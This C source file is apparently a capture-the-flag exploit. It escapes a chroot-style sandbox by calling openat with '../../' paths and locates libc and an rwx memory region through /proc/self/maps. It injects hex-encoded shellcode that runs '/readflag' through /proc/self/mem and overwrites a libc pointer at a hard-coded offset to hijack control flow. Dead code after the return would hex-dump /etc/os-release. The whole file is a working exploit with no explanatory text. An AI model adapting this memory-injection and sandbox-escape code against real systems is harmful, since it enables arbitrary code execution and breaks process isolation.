#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>

#define open_fd(path, ...) openat(rootfd, "../../" path, __VA_ARGS__)

int rootfd, mapfd;
FILE *map;

int read_maps() {
  fseek(map, 0, 0);
  char line[0x1000];
  size_t start, end;
  size_t libc = 0, shellcode = 0;
  for(;;) {
	  if(!fgets(line, sizeof(line), map)) break;
    sscanf(line, "%lx-%lx", &start, &end);
    if(strstr(line, "rwx")) {
      shellcode = start + 0xf00;
    }
    if(strstr(line, "libc-") && !libc) {
      libc = start;
    }
  }
  printf("target: %p\n", shellcode);
  printf("libc  : %p\n", libc);
  int memfd = open_fd("/proc/self/mem", O_RDWR);
  lseek(memfd, shellcode, 0);
  char code[] = "\x6A\x01\x5F\x48\x8D\x35\x22\x00\x00\x00\x48\xC7\xC2\x09\x00\x00\x00\xB8\x01\x00\x00\x00\x0F\x05\x48\x31\xD2\x48\x31\xF6\x48\x8D\x3D\x07\x00\x00\x00\xB8\x3B\x00\x00\x00\x0F\x05\x2F\x72\x65\x61\x64\x66\x6C\x61\x67\x00";
  write(memfd, code, sizeof(code) - 1);
  lseek(memfd, libc+0x00000000001C1E70, 0);
  size_t addr = shellcode;
  write(memfd, &addr, 8);
  puts("hello");
  exit(0);
}

int main() {
  rootfd = open("/", 0);
  mapfd = open_fd("/proc/self/maps", O_RDONLY);
  map = fdopen(mapfd, "r");
  read_maps();
  return 0;
  char buf[0x1000], sbuf[0x8000];
  int libc = open_fd("/etc/os-release", O_RDONLY);
  for(;;) {
    int size = read(libc, buf, 0x1000);
    if(size <= 0) break;
    for(int i = 0; i < size; i++) {
      sprintf(sbuf + i * 2, "%02hhx", buf[i]);
    }
    strcat(sbuf, "-line");
    puts(sbuf);
  }
}
